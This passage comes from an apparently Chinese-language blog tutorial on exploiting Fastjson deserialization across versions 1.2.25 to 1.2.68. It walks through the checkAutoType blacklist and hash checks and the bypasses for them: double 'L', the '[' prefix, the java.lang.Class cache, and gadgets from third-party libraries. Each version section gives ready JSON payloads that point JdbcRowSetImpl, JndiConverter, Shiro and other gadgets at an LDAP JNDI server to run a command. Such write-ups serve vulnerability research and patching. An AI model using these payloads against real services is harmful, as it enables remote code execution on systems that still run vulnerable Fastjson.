class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">int</span> i;<br>            String deny;<br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.denyList[i];<br>                <span class="hljs-comment">//若目标类在黑名单中且不在map中才会抛出异常</span><br>                <span class="hljs-keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>            clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> clazz; <span class="hljs-comment">//返回目标类</span><br>            &#125;<br></code></pre></td></tr></table></figure>

<h5 id="PAYLOAD-3"><a href="#PAYLOAD-3" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="3-Fastjson-1-2-42"><a href="#3-Fastjson-1-2-42" class="headerlink" title="3 	Fastjson &#x3D; 1.2.42"></a>3 	Fastjson &#x3D; 1.2.42</h3><h5 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p>
<h5 id="利用链分析：-4"><a href="#利用链分析：-4" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,双写L即可绕过</p>
<p><img src="/image/image-20220909165153536-16627135155325.png" srcset="/img/loading.gif" lazyload alt="image-20220909165153536"></p>
<h5 id="PAYLOAD-4"><a href="#PAYLOAD-4" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="4-Fastjson-1-2-43"><a href="#4-Fastjson-1-2-43" class="headerlink" title="4 	Fastjson &#x3D; 1.2.43"></a>4 	Fastjson &#x3D; 1.2.43</h3><h5 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p>
<h5 id="利用链分析：-5"><a href="#利用链分析：-5" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p>
<p>ParserConfig#checkAutoType()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>    <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TypeUtils#loadClass()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125; <br></code></pre></td></tr></table></figure>

<h5 id="PAYLOAD-5"><a href="#PAYLOAD-5" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="5Fastjson-1-2-44"><a href="#5Fastjson-1-2-44" class="headerlink" title="5	Fastjson &#x3D; 1.2.44"></a>5	Fastjson &#x3D; 1.2.44</h3><h5 id="利用链分析：-6"><a href="#利用链分析：-6" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &#x3D; 1.2.44修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕过方法失效，可使用JSON内置payload</p>
<p><img src="/image/2fd4e3fa452461f51e7ab30b40d2e497.png" srcset="/img/loading.gif" lazyload alt="preload"></p>
<h5 id="PAYLOAD-6"><a href="#PAYLOAD-6" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="6Fastjson-1-2-47"><a href="#6Fastjson-1-2-47" class="headerlink" title="6	Fastjson &#x3D; 1.2.47"></a>6	Fastjson &#x3D; 1.2.47</h3><h5 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p>
<p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p>
<h5 id="利用链分析：-7"><a href="#利用链分析：-7" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>利用链为上述1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41中PAYLOAD2利用链</p>
<h5 id="PAYLOAD-7"><a href="#PAYLOAD-7" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="71-2-48"><a href="#71-2-48" class="headerlink" title="7	1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67"></a>7	1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</h3><h5 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67 </p>
<h5 id="利用链分析：-8"><a href="#利用链分析：-8" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p>
<h5 id="PAYLOAD-8"><a href="#PAYLOAD-8" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>fastjson &lt;&#x3D; 1.2.62黑名单绕过：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//依赖</span><br><span class="hljs-comment">//	&lt;dependency&gt;</span><br><span class="hljs-comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="hljs-comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="hljs-comment">//          &lt;version&gt;x.x&lt;/version&gt;</span><br><span class="hljs-comment">//     &lt;/dependency&gt;</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>

<p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties:&#123;&quot;</span><span class="hljs-meta">@type</span><span class="hljs-string">&quot;:&quot;</span>java.util.Properties<span class="hljs-string">&quot;,&quot;</span>UserTransaction<span class="hljs-string">&quot;:&quot;</span>ldap:<span class="hljs-comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="8Fastjson-1-2-68"><a href="#8Fastjson-1-2-68" class="headerlink" title="8	Fastjson &#x3D; 1.2.68"></a>8	Fastjson &#x3D; 1.2.68</h3><h5 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h5><p>存在相应依赖</p>
<h5 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析:"></a>利用链分析:</h5><h6 id="1-checkAutoType"><a href="#1-checkAutoType" class="headerlink" title="1.checkAutoType"></a>1.checkAutoType</h6><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验：</p>
<p>expectClass为空：</p>
<ol>
<li>typeNmae不在denyHashCodes黑名单中（必须条件）</li>
<li>SafeMode为false（必要条件，默认为false）</li>
<li>typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为expectClass子类</li>
</ol>
<p>expectClass不为空：</p>
<ol>
<li>typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</li>
<li>autoTypeSupport为false（默认为false）</li>
<li>expectClass在TypeUtils#mappings中</li>
<li>typeName不是ClassLoader、DataSource、RowSet的子类</li>
<li>expectClass不为null，且不为Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class</li>
<li>typeName是expectClass的子类</li>
</ol>
<p>ParserConfig#checkAutoType()方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空 不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br>		<span class="hljs-comment">//1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//默认不进入</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//expectClass为期望类，</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expectClass != Object.class &amp;&amp; expectClass != Serializable.class &amp;&amp; expectClass != Cloneable.class &amp;&amp; expectClass != Closeable.class &amp;&amp; expectClass != EventListener.class &amp;&amp; expectClass != Iterable.class &amp;&amp; expectClass != Collection.class) &#123;<span class="hljs-comment">//判断期望类是否为以上类</span><br>                expectClassFlag = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">//!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        